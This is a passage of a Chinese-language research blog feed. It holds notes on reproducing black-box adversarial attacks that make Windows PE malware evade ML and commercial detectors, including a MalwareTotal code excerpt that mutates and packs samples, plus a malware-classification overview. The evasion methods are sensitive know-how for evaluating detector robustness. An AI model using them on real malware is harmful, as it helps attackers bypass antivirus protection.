的实例），前提是这不会影响后续的代码。</li><li>使用依赖图重新排序指令，以确保不会在依赖于某指令的指令之前出现该指令。</li><li>改变寄存器值在栈中的推入和弹出顺序，以确保它们在函数调用过程中被保存。</li></ol><p>从两个方面比较了攻击的总体成功率：</p><ul><li>一是被误分类的二进制文件在10次重复攻击中至少一次成功的百分比（覆盖率）；</li><li>二是所有被攻击的二进制文件中攻击成功的总体百分比（效力）。</li></ul><p>操作<code>manipulations</code>，来自<code>binary_transform.py</code></p><ul><li>等效指令替换</li><li>寄存器交换</li><li>寄存器保留</li><li>指令重排</li><li>代码块位移</li><li>语义空操作</li></ul><p><strong>仓库只提供了一个简单的binary_transform.py，并没有给出完整的攻击框架，因此这篇论文的复现难度较高</strong>❗️</p><p>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</p><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.00-3083355.png" alt="截屏2024-07-23 15.38.00"></p><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-08-09%2015.19.45.png" alt="截屏2024-08-09 15.19.45"></p><ul><li>论文中对reservaton的检测是举例检测，而非在攻击框架中检测，并且在<code>test-correctness.py</code>中并没有实现自动化功能性验证</li></ul><blockquote><p>思考，对于只返回0和1的问题来说，如何设置爬山算法呢</p></blockquote><h2 id="Functionality-Preserving-Black-Box-Optimization-of-Adversarial-Windows-Malware-实验复现"><a href="#Functionality-Preserving-Black-Box-Optimization-of-Adversarial-Windows-Malware-实验复现" class="headerlink" title="Functionality-Preserving Black-Box Optimization of Adversarial Windows Malware 实验复现"></a>Functionality-Preserving Black-Box Optimization of Adversarial Windows Malware 实验复现</h2><p>为什么会发现这些缺点：</p><ul><li>查询效率低，因为它们依赖于对输入的恶意软件进行随机变换的迭代应用；</li><li>它们还可能需要在优化过程的每次迭代中，在沙箱中执行对抗性恶意软件，以确保其入侵功能得到保留。</li></ul><p>操作：</p><ul><li>从良性软件中提取内容而非随机生成。</li><li>计算目标惩罚是按照修改后文件大小的变化惩罚</li></ul><p>怀疑实验效果并没有论文中所述的这么好。</p><p>代码结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CGammaSectionsEvasionProblem &lt;= 继承自 = CGammaEvasionProblem &lt;= 继承自 = CBlackBoxProblem</span><br><span class="line"></span><br><span class="line">CGammaSectionsEvasionProblem 实现 section injection，等价于section add 将新的节注入到样本中</span><br><span class="line"></span><br><span class="line">CGammaEvasionProblem 实现的 padding 等价于 overlay_append，将内容附加在样本末尾</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGeneticAlgorithm &lt;= 继承自 = CAttackEvasion</span><br></pre></td></tr></table></figure><ul><li>要继承第三方病毒查杀，需要将代码嵌入<code>c_base_genetic_engine.py</code> 中的<code>run</code>函数</li></ul><h3 id="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-4"><a href="#针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-4" class="headerlink" title="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："></a>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</h3><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.00-3608424.png" alt="截屏2024-07-23 15.38.00"></p><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-08-14%2012.07.42.png" alt="截屏2024-08-14 12.07.42"></p><ul><li>没想明白为什么这篇论文能ccf a</li></ul><h3 id="Adversarial-EXEmples-A-Survey-and-Experimental-Evaluation-of-Practical-Attacks-on-Machine-Learning-for-Windows-Malware-Detection-1"><a href="#Adversarial-EXEmples-A-Survey-and-Experimental-Evaluation-of-Practical-Attacks-on-Machine-Learning-for-Windows-Malware-Detection-1" class="headerlink" title="Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection"></a>Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection</h3><p>这个就是把之前提的东西整理一遍，但没有加入商用软件的接口</p><h2 id="MalwareTotal-实验复现"><a href="#MalwareTotal-实验复现" class="headerlink" title="MalwareTotal 实验复现"></a>MalwareTotal 实验复现</h2><h3 id="评估性能的关键指标"><a href="#评估性能的关键指标" class="headerlink" title="评估性能的关键指标"></a>评估性能的关键指标</h3><ol><li>攻击成功率（ASR）</li><li>查询预算（Q）查询预算表示在生成过程中调用杀毒软件检测器的总次数</li><li>规避成本（𝛼）：定义为 对抗性样本的文件大小不超过原文件的1+𝛼倍，规避成本是修改后恶意软件大小的平均值，表示在生成过程中注入了多少字节</li><li>时间消耗（T）</li><li>功能性</li></ol><h3 id="代码中需要补充的地方："><a href="#代码中需要补充的地方：" class="headerlink" title="代码中需要补充的地方："></a>代码中需要补充的地方：</h3><p>统计哪个操作是关键操作</p><p>创新之处：</p><ul><li>与其他规避攻击不同，MalwareTotal专注于直接优化最小操作序列，而不是优化最小注入。这是因为恶意软件变异的顺序特性。</li><li>MalwareTotal简单易用，适用于实际场景，因为它是一种查询高效的规避攻击，仅需要黑盒恶意软件检测器提供的硬标签。</li></ul><p>变异操作：</p><ul><li>Header manipulation</li><li>Section manipulation</li><li>Overlay manipulation</li><li>Compound manipulation</li></ul><p>对于维持功能性的检查：比较cuckoo返回的签名，如果相同则证明保持了功能性</p><p>❗️发现在代码中，达到最大轮次后会执行一个加密操作</p><blockquote><p>在初始训练阶段，模型不断选择操作23，而不是设计出有效的操作序列。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行动作并检查样本是否被跳过</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_take_action</span>(<span class="params">self, action_ix</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin_size = sys.getsizeof(self.bytez)/<span class="number">1048576</span> <span class="comment"># 1024**2</span></span><br><span class="line"><span class="keyword">if</span>  bin_size &gt;= self.max_file_size:</span><br><span class="line">crash_prompt(<span class="string">f&#x27;In taking actions, file size is larger than the max_file_size, thereby skipped&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span>  <span class="literal">True</span>  </span><br><span class="line"><span class="keyword">try</span> :</span><br><span class="line">binary = pefile.PE(self.file_path)</span><br><span class="line">is_skipped = <span class="literal">False</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">crash_prompt(<span class="string">f&#x27;in parsing pe... &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span>  <span class="literal">True</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_skipped :</span><br><span class="line"></span><br><span class="line">action = ACTION_LOOKUP[action_ix]</span><br><span class="line"><span class="comment"># action = &quot;add_imports&quot;</span></span><br><span class="line"></span><br><span class="line">self.curr_action = action</span><br><span class="line"><span class="comment"># crash_prompt(f&#x27;taking action name:  &#123;action&#125;&#x27;)</span></span><br><span class="line">self.history[self.sha256][<span class="string">&quot;actions&quot;</span>].append(action)</span><br><span class="line"><span class="keyword">try</span> :</span><br><span class="line">self.bytez, is_skipped = mt_action.modify_sample(self.bytez, action, self.sha256, self.pe, self.file_path)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">crash_prompt(<span class="string">f&#x27;Exception in _take_action <span class="subst">&#123;self.curr_action&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># crash_prompt(f&#x27;&#x27;)</span></span><br><span class="line">crash_prompt(<span class="string">f&#x27;Error is : <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span>  <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self.turns == self.maxturns  : ❗️❗️❗️❗️❗️❗️</span><br><span class="line">action = <span class="string">&quot;obsi_pack&quot;</span></span><br><span class="line"><span class="keyword">try</span> :</span><br><span class="line"><span class="comment"># 执行修改操作，并返回修改后的样本和是否跳过的标志</span></span><br><span class="line">self.bytez, is_skipped = mt_action.modify_sample(self.bytez, action, self.sha256, self.pe, self.file_path)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line"><span class="comment"># crash_prompt(f&#x27;Exception in _take_action obsi_pack: &#123;e&#125;&#x27;)</span></span><br><span class="line">crash_prompt(<span class="string">f&#x27;Exception in _take_action obsi_pack:&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span>  <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> is_skipped</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="MalGuise-实验复现记录："><a href="#MalGuise-实验复现记录：" class="headerlink" title="MalGuise 实验复现记录："></a>MalGuise 实验复现记录：</h2><p>MalGuise实现了两个操作<code>slack_space</code>和’new_section’，也即将无语义操作<code>semnop</code>插入到PE文件的空闲位置，在第一个可执行段的末尾除插入跳转指令到无语义操作，执行完成后返回。并通过<code>mcts</code>求解。</p><h3 id="代码中存在的问题"><a href="#代码中存在的问题" class="headerlink" title="代码中存在的问题:"></a><strong>代码中存在的问题:</strong></h3><ul><li>在计算<code>rva_to_be_injected</code>时没有<strong>越界检查</strong>，会导致覆盖有效内容段</li><li>无法使用作者给的办法部署<code>MalGuise troch serve</code></li><li>当前还一次还只能处理一个病毒样本</li><li>❗️注意：只支持输入32位PE文件</li></ul><h3 id="我对代码修改的部分："><a href="#我对代码修改的部分：" class="headerlink" title="我对代码修改的部分："></a><strong>我对代码修改的部分</strong>：</h3><ul><li>在<code>patch.py</code>中增加了段越界检查，并在<code>ClASS mcts_state</code>中增加<code>rva_to_be_injected_exceed_section</code>用于终端该结点往下的搜索。</li><li>新增<code>malgraph_handler.py</code>、<code>load_malgraph_model.py</code>和<code>test_deployed_server.py</code>用于部署<code>Malgraph Torch Serve</code>，详细的部署过程记录在 <code>README</code>中。</li></ul><h3 id="如何加入新的检测器"><a href="#如何加入新的检测器" class="headerlink" title="如何加入新的检测器:"></a><strong>如何加入新的检测器</strong>:</h3><p>在<code>classfier.py</code>的<code>Classifier</code>类中增加新的检测器的判断，在<code>models</code>文件夹下新建<code>ClamAV</code>文件夹并实现一个<code>ClamAV</code>的类。</p><h2 id="MAB-Malware-实验复现记录"><a href="#MAB-Malware-实验复现记录" class="headerlink" title="MAB-Malware 实验复现记录"></a>MAB-Malware 实验复现记录</h2><h3 id="代码过程："><a href="#代码过程：" class="headerlink" title="代码过程："></a>代码过程：</h3><p>**Binary Rewriter:**作者用 pefile 这个库重新实现了 13 个 action，但与先前工作不同的是，作 者区分了 macro-action 和 micro-action 这两种概念，因为一个 marco- action 可能影响恶意样本的多个 feature，如果另一 action 只影响了其中一 部分，便认为其是原 action 的 micro-action。作者实现了 5 种 micro-action， 和对应的 macro-action 相一致，不过只添加 1 字节的内容，比如 SA (section add) 会改变文件的哈希值、section 数量和字节熵(byte entropy)这三个特 征，而 SA1 则只改变前两个特征。</p><p>**Action Minimizer:**恶意样本逃逸成功后，可以移除多余的 action，并用 micro-action 代替 macro- action 来产生特征改变较小的对抗样本。对恶意样本 x 连续施加 a1, a2, a3 三个 action 后得到了逃逸样本，不施加 a1 仍然能够逃逸，因此可以 移除这一无用 action，而对 a2, a3 尝试用 micro-action 替代，最终得到最小化 的样本。</p><h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><p>由于<code>code randomization</code>的操作是提前完成的，得到的样本保存在了<code>data/malware.CR</code>中，所有当<code>arm</code>选择到<code>CR</code>这一操作后，其实前面所做的操作都会丢失，而如果<code>data/malware.CR</code>中没有对应的样本，则该操作失效。所有的<code>data/malware.CR</code>中的样本通过<code>https://github.com/vpappas/orp</code>得到。</p><h2 id="MAlWARE-GAN-实验复现记录"><a href="#MAlWARE-GAN-实验复现记录" class="headerlink" title="MAlWARE-GAN 实验复现记录"></a>MAlWARE-GAN 实验复现记录</h2><p>问题：仅生成对抗性样本的API Feature，而不是真正的二进制文件。</p><p><code>Pesidious</code>中的问题，<code>MALWARE-GAN</code>中，训练<code>GAN</code>采用的方式是，将PE二进制文件的<code>section</code>和<code>import function</code>提取出来，输入到检测器和替代检测器中进行训练，这是因为其预先设定好attacker知道检测器使用的特征知识。无法泛化到商业检测器中。</p><p>如果非要测试<code>MALWARE-GAN</code>，方法则是使用<strong>商用检测器</strong>替换代码中的检测器。（感觉还挺复杂的，在训练GAN的时候生成器也必须生成完整的二进制文件，然后喂给商用检测器，但是<strong>替代检测器</strong>仍然按照论文中保持只知道<code>section</code>和<code>import function</code>的知识，怀疑这种根本无法生成训练模型）</p><h2 id="ARMED-RL-实验复现记录"><a href="#ARMED-RL-实验复现记录" class="headerlink" title="ARMED-RL 实验复现记录"></a>ARMED-RL 实验复现记录</h2><h3 id="存在的问题："><a href="#存在的问题：" class="headerlink" title="存在的问题："></a>存在的问题：</h3><p>仓库中<code>FAME/db/rl</code>没有保存的智能体<code>agent</code>，需要重新训练。</p><h1 id="训练和运行："><a href="#训练和运行：" class="headerlink" title="训练和运行："></a>训练和运行：</h1><h2 id="Malware-rl"><a href="#Malware-rl" class="headerlink" title="Malware_rl"></a>Malware_rl</h2><h3 id="论文的设置："><a href="#论文的设置：" class="headerlink" title="论文的设置："></a>论文的设置：</h3><p>论文中训练了四个代理，对每个sample变异10次，总计50000次变异训练，选择病毒是随机的</p><ul><li>50000个随机病毒</li><li>2600个勒索病毒</li><li>1600virut病毒</li><li>4100browsefox病毒</li></ul><p>随机策略：每个样本10次变异</p><h3 id="我的小规模试验设置"><a href="#我的小规模试验设置" class="headerlink" title="我的小规模试验设置"></a>我的小规模试验设置</h3><ul><li><p><strong>强化学习策略</strong>：</p><ul><li>针对4个检测器训练4个代理：</li><li>训练集：gamevance中的100个样本，总共训练1000 timesteps</li><li>测试集： hupigon的100个样本，每个样本变异10次</li><li>对于商用软件，训练时的观测值采用malconv的观测值 <em><strong>学的是什么呢</strong></em></li></ul></li><li><p><strong>训练花费：</strong></p><ul><li>针对MalConv，在gamevance中的100个样本，总共训练1000 timesteps,</li><li>针对Ember，在gamevance中的100个样本，总共训练1000 timesteps,</li><li>针对Clamav，在gamevance中的100个样本，总共训练1000 timesteps,训练时的观测值采用malconv的观测值</li><li>针对malgrah，在gamevance中的100个样本，总共训练1000 timesteps,训练时的观测值采用malconv的观测值</li></ul></li><li><p><strong>随机策略：</strong></p><ul><li>对hupigon的100个样本，每个样本变异10次，结果已经保存到logs中，对malgraph的时间最长69个识别为恶意的样本花费1.5小时</li></ul></li></ul><h2 id="MalwareTotal"><a href="#MalwareTotal" class="headerlink" title="MalwareTotal:"></a>MalwareTotal:</h2><p><strong>论文设置：</strong></p><p><strong>我的小规模试验设置：</strong></p><p><strong>训练集：</strong></p><p><strong>训练参数：</strong></p><ul><li>gamevance中的100个样本</li><li>总共训练3000 timesteps</li><li>每个环境的maxturns 设置为 30</li><li>self.alpha &#x3D; 5.5 # 论文中的图2</li></ul><p><strong>训练花费：</strong></p><ul><li>针对malconv的训练时间： 2:06:59.202835</li></ul><h2 id="MalGuise"><a href="#MalGuise" class="headerlink" title="MalGuise:"></a>MalGuise:</h2><p><strong>论文设置：</strong></p><h2 id="AIMED"><a href="#AIMED" class="headerlink" title="AIMED"></a>AIMED</h2><p><strong>论文设置：</strong></p><ul><li>10 generation</li><li>10 perturbution</li><li>4 Population</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Evaluation of Black-box Portable Executable (PE) Adversarial Attack&lt;/p&gt;
&lt;p&gt;DEADLINE 1.24&lt;/p&gt;
&lt;p&gt;UC&lt;/p&gt;
&lt;p&gt;这周搭建沙盒，看看alive的病毒占比多少&lt;/p&gt;
&lt;p&gt;看看</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>malware-classification</title>
    <link href="http://example.com/2024/06/24/malware-classification/"/>
    <id>http://example.com/2024/06/24/malware-classification/</id>
    <published>2024-06-24T04:23:58.000Z</published>
    <updated>2024-06-27T06:34:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="恶意代码分类报告"><a href="#恶意代码分类报告" class="headerlink" title="恶意代码分类报告"></a>恶意代码分类报告</h1><h2 id="1-恶意代码行为分析"><a href="#1-恶意代码行为分析" class="headerlink" title="1. 恶意代码行为分析"></a>1. 恶意代码行为分析</h2><h3 id="1-1-下载器和启动器"><a href="#1-1-下载器和启动器" class="headerlink" title="1.1 下载器和启动器"></a>1.1 下载器和启动器</h3><p>下载器通常会与**漏洞利用<code>exploit</code>**打包在一起。下载器通常使用<code>Windows API</code>函数<code>URLDownloadtoFileA</code>和<code>WinExec</code>，来下载并运行新的恶意代码。</p><h3 id="1-2-后门"><a href="#1-2-后门" class="headerlink" title="1.2 后门"></a>1.2 后门</h3><p>后门能让攻击者远程访问一个受害的机器。</p><p>一个常用的方法是利用80端口使用HTTP协议。</p><p>查看后门使用和导入的<code>Windows</code>函数，可以确定后门实现的功能。</p><h3 id="1-3-反向shell"><a href="#1-3-反向shell" class="headerlink" title="1.3 反向shell"></a>1.3 反向shell</h3><p>反向shell是从被感染机器上发起一个链接，它提供攻击者shell访问被感染机器的权限。</p><h3 id="1-4-远程控制工具"><a href="#1-4-远程控制工具" class="headerlink" title="1.4 远程控制工具"></a>1.4 远程控制工具</h3><p>远程控制工具RAT被用来远程管理一台或多台计算机。</p><h3 id="1-5-僵尸网络"><a href="#1-5-僵尸网络" class="headerlink" title="1.5 僵尸网络"></a>1.5 僵尸网络</h3><h3 id="1-6-登陆凭证窃密器"><a href="#1-6-登陆凭证窃密器" class="headerlink" title="1.6 登陆凭证窃密器"></a>1.6 登陆凭证窃密器</h3><h3 id="1-7-存活机制"><a href="#1-7-存活机制" class="headerlink" title="1.7 存活机制"></a>1.7 存活机制</h3><h3 id="1-8-提权"><a href="#1-8-提权" class="headerlink" title="1.8 提权"></a>1.8 提权</h3><h3 id="1-9-隐密-用户态rootkit"><a href="#1-9-隐密-用户态rootkit" class="headerlink" title="1.9 隐密-用户态rootkit"></a>1.9 隐密-用户态rootkit</h3><h2 id="2-Virustotal检测病毒的方法"><a href="#2-Virustotal检测病毒的方法" class="headerlink" title="2. Virustotal检测病毒的方法"></a>2. Virustotal检测病毒的方法</h2><p>通过<code>Crowdsourced Sigma Rules</code>和<code>Crowdsourced IDS rules</code>猜测使用的是</p><ul><li><code>https://github.com/SigmaHQ/sigma</code> 这个是出现次数最到的</li><li><code>https://github.com/travisbgreen/hunting-rules</code></li><li><code>https://github.com/aws-samples/aws-network-firewall-rulegroups-with-proofpoints-emerging-threats-open-ruleset</code></li><li><code>https://snort.org/documents/registered-vs-subscriber</code></li><li><code>https://github.com/kevoreilly/CAPEv2</code></li></ul><h3 id="2-1-sigma是一种动态分析方法"><a href="#2-1-sigma是一种动态分析方法" class="headerlink" title="2.1 sigma是一种动态分析方法"></a>2.1 sigma是一种动态分析方法</h3><p>仓库 <code>https://github.com/SigmaHQ/sigma</code></p><p>sigma通过查询windows日志文件<code>log file</code>的方法检测病毒。</p><p>这意味着sigma必须要在代码运行后才能通过日志检测病毒行为。</p><h3 id="2-2-yara"><a href="#2-2-yara" class="headerlink" title="2.2 yara"></a>2.2 yara</h3><p><strong>YARA是一款旨在帮助恶意软件研究人员识别和分类恶意软件样本的开源工具（由virustotal 的软件工程师Victor M. Alvarezk开发），使用YARA可以基于文本或二进制模式创建恶意软件家族描述信息，当然也可以是其他匹配信息。</strong></p><p><img src="/../images/malware-classification/%E6%88%AA%E5%B1%8F2024-06-24%2015.46.53-9292834.png" alt="截屏2024-06-24 15.46.53"></p><h3 id="2-3-ClamAV-是一种基于特征码扫描的杀毒软件"><a href="#2-3-ClamAV-是一种基于特征码扫描的杀毒软件" class="headerlink" title="2.3 ClamAV 是一种基于特征码扫描的杀毒软件"></a>2.3 ClamAV 是一种基于特征码扫描的杀毒软件</h3><h3 id="2-4-CAPEv2-是一种sandbox"><a href="#2-4-CAPEv2-是一种sandbox" class="headerlink" title="2.4 CAPEv2 是一种sandbox"></a>2.4 CAPEv2 是一种sandbox</h3><p>功能：</p><ul><li>基于 API 钩子的行为监测</li><li>捕获执行期间创建、修改和删除的文件</li><li>以 PCAP 格式捕获网络流量</li><li>基于行为和网络签名的恶意软件分类</li><li>在恶意软件执行期间捕获桌面截图</li><li>目标系统的完整内存转储</li><li>自动动态恶意软件解包</li><li>基于对解包负载的 YARA 签名的恶意软件分类</li><li>静态和动态恶意软件配置提取</li><li>可通过 YARA 签名编程的自动化调试器，允许：</li></ul><h3 id="2-5-signature-base"><a href="#2-5-signature-base" class="headerlink" title="2.5 signature-base"></a>2.5 signature-base</h3><ul><li>Arnim Rupp (<a href="https://github.com/ruppde">https://github.com/ruppde</a>)</li><li><a href="https://github.com/Neo23x0/signature-base">https://github.com/Neo23x0/signature-base</a></li></ul><h2 id="3-Virustotal-Threat-Label"><a href="#3-Virustotal-Threat-Label" class="headerlink" title="3. Virustotal Threat Label"></a>3. Virustotal Threat Label</h2><ul><li><p>Trojan：</p><p><strong>定义</strong>：特洛伊木马是一种恶意软件，它伪装成合法的软件或隐藏在合法软件中。用户在不知情的情况下执行这些看似无害的程序，从而激活了木马的恶意功能。</p><p><strong>功能</strong>：木马可以执行多种恶意活动，如远程控制、窃取数据、安装其他恶意软件、监视用户行为等。</p><p><strong>隐蔽性</strong>：木马不具备自我复制的能力，它们依赖于用户的误操作或诱导，这使得它们在不被察觉的情况下运行。</p></li><li><p>Dropper:</p><p><strong>定义</strong>：投放器是一种设计用来“投放”或安装其他恶意软件到受害者系统的恶意程序。投放器本身可能不执行任何明显的恶意活动，但它会创建一个环境或路径，使其他恶意程序可以被安装和执行。</p><p><strong>功能</strong>：投放器通常包含一个或多个其他恶意软件的负载，它在执行时会悄无声息地释放这些负载到宿主机上。</p><p><strong>使用目的</strong>：投放器的主要目的是作为多阶段攻击的一部分，先安静地进入系统，然后部署更具破坏性或窃取性的恶意软件。</p></li><li><p>Virus：病毒是自我复制的恶意软件，它传播的方式是通过插入自己的代码到其他程序或文件中。</p></li><li><h3 id="Spyware（间谍软件）"><a href="#Spyware（间谍软件）" class="headerlink" title="Spyware（间谍软件）"></a>Spyware（间谍软件）</h3><p><strong>定义</strong>：间谍软件是设计用来从用户的计算机上秘密收集用户的信息的软件。它通常在不告知用户的情况下运行，收集诸如键盘输入、浏览习惯、登录凭证等敏感信息。</p><p><strong>功能</strong>：间谍软件可能用于广告目的（显示定制广告），也可能用于更恶意的目的，如身份盗窃或金融诈骗。</p></li></ul><h2 id="4-针对不同packer的检测"><a href="#4-针对不同packer的检测" class="headerlink" title="4. 针对不同packer的检测"></a>4. 针对不同packer的检测</h2><h3 id="4-1-upx"><a href="#4-1-upx" class="headerlink" title="4.1 upx"></a>4.1 upx</h3><p>hello_uninfected.exe 打包前 3&#x2F;72；打包后 9&#x2F;73；CrowdStrike Falcon； Cynet；Microsoft；SecureAge；Symantec；Trapmine；Webroot。</p><p>hello_infected.exe 打包前 11&#x2F;74；打包后 17&#x2F;74</p><p>VirusShare_0ac9b76b75dc91d42e0ca83a4890cbe0</p><table><thead><tr><th>文件名</th><th>打包前</th><th>打包后</th><th>病毒分类</th></tr></thead><tbody><tr><td>hello_uninfected.exe</td><td>3&#x2F;72</td><td>9&#x2F;73</td><td></td></tr><tr><td>hello_infected.exe</td><td>11&#x2F;73</td><td>17&#x2F;74</td><td></td></tr><tr><td>VirusShare_0ac9b76b75dc91d42e0ca83a4890cbe0</td><td>52&#x2F;74</td><td>26&#x2F;73</td><td></td></tr></tbody></table><h3 id="4-2-PELock"><a href="#4-2-PELock" class="headerlink" title="4.2 PELock"></a>4.2 PELock</h3><h3 id="4-3-PECompact"><a href="#4-3-PECompact" class="headerlink" title="4.3 PECompact"></a>4.3 PECompact</h3><h3 id="4-4-Obsidium"><a href="#4-4-Obsidium" class="headerlink" title="4.4 Obsidium"></a>4.4 Obsidium</h3><h3 id="4-5-Petite"><a href="#4-5-Petite" class="headerlink" title="4.5 Petite"></a>4.5 Petite</h3><h3 id="4-6-tElock"><a href="#4-6-tElock" class="headerlink" title="4.6 tElock"></a>4.6 tElock</h3><h3 id="4-7-Themida"><a href="#4-7-Themida" class="headerlink" title="4.7 Themida"></a>4.7 Themida</h3><h3 id="4-8-MPRESS"><a href="#4-8-MPRESS" class="headerlink" title="4.8 MPRESS"></a>4.8 MPRESS</h3><h3 id="4-9-kkrunchy"><a href="#4-9-kkrunchy" class="headerlink" title="4.9 kkrunchy"></a>4.9 kkrunchy</h3><h2 id="5-Malware-classification-and-composition-analysis-A-survey-of-recent-developments"><a href="#5-Malware-classification-and-composition-analysis-A-survey-of-recent-developments" class="headerlink" title="5 Malware classification and composition analysis: A survey of recent developments"></a>5 Malware classification and composition analysis: A survey of recent developments</h2><p>我们的分析识别出需要解决的三个主要问题。</p><ul><li>第一个是需要克服现代逃避技术（或反分析技术）如变形技术。</li><li>第二个问题涉及到恶意软件搜索引擎的效率和可扩展性，因为仓库中的功能数量可能需要扩展到数百万。</li><li>第三个问题涉及到恶意软件分类系统对不断进化的对抗性示例的脆弱性。</li></ul><p>本调查的主要贡献包括：</p><ul><li>提出一种新的分类法，用于描述和比较恶意软件分类和组成分析的最新和主要发现。</li><li>设计了一个新框架，用于分析现有的恶意软件分类和组成分析技术。</li><li>确定并展示与恶意软件分析相关的开放性问题和挑战。</li><li>确定了该主题的一些趋势，并提供了指导方针，说明如何改进现有解决方案以应对新的和持续的挑战。</li></ul><p>我们还发现了需要进一步研究和调查的可能主题，如可持续的恶意软件分析系统。在这方面，我们提出了一些准备高效和可信的恶意软件检测和分析系统的指导方针。</p><h3 id="5-1-通过签名的方法探测和分类恶意软件"><a href="#5-1-通过签名的方法探测和分类恶意软件" class="headerlink" title="5.1 通过签名的方法探测和分类恶意软件"></a>5.1 通过签名的方法探测和分类恶意软件</h3><ul><li>[12]  Schultz MG, Eskin E, Zadok F, Stolfo SJ. Data mining methods for detection of new malicious executables. In: Security and privacy, 2001. S&amp;P 2001. Proceedings. 2001 IEEE symposium on. IEEE; 2001, p. 38–49.</li><li>[13]  Christodorescu M, Jha S. Static analysis of executables to detect malicious patterns. Technical report, Wisconsin Univ-Madison Dept of Computer Sciences; 2006.</li></ul><h3 id="5-2-自动签名生成方法"><a href="#5-2-自动签名生成方法" class="headerlink" title="5.2 自动签名生成方法"></a>5.2 自动签名生成方法</h3><ul><li>[14]  Chen J, Alalfi MH, Dean TR, Zou Y. Detecting android malware using clone detection. J Comput Sci Tech 2015;30(5):942–56.</li><li>[15]  Cesare S, Xiang Y. Classification of malware using structured control flow. In: Proceedings of the eighth Australasian symposium on parallel and distributed computing-volume 107. Australian Computer Society, Inc.; 2010, p. 61–70.</li><li>[16]  Ye Y, Li T, Huang K, Jiang Q, Chen Y. Hierarchical associative classifier (HAC) for malware detection from the large and imbalanced gray list. J Intell Inf Syst 2010;35(1):1–20.</li></ul><h3 id="5-3-机器学习模型检测和分类恶意软件"><a href="#5-3-机器学习模型检测和分类恶意软件" class="headerlink" title="5.3 机器学习模型检测和分类恶意软件"></a>5.3 机器学习模型检测和分类恶意软件</h3><blockquote><p>当恶意软件防御者提出使用某些特征和机器学习模型的新恶意软件分析系统时，恶意软件创建者通常会更新他们的恶意软件设计以避免被检测。然后，恶意软件防御者会提出新系统来检测和分析新一代的恶意软件，如此反复。恶意软件防御者和攻击者之间的这种竞赛可能永远不会结束。</p></blockquote><ul><li>[12] Schultz MG, Eskin E, Zadok F, Stolfo SJ. Data mining methods for detection of new malicious executables. In: Security and privacy, 2001. S&amp;P 2001.</li><li>[17]  Kolter JZ, Maloof MA. Learning to detect malicious executables in the wild. In: Proceedings of the Tenth ACM SIGKDD International Conference on Knowledge Discovery and Data Mining. ACM; 2004, p. 470–8.</li><li>[18]  Moskovitch R, Feher C, Tzachar N, Berger E, Gitelman M, Dolev S, Elovici Y. Unknown malcode detection using opcode representation. In: Intelligence and security informatics. Springer; 2008, p. 204–15.</li><li>[19]  Dai J, Guha RK, Lee J. Efficient virus detection using dynamic instruction sequences. J Comput Phys 2009;4(5):405–14.</li><li>[20]  Nataraj L, Karthikeyan S, Jacob G, Manjunath B. Malware images: visualization and automatic classification. In: Proceedings of the 8th international symposium on visualization for cyber security. ACM; 2011, p. 4.</li><li>[21]  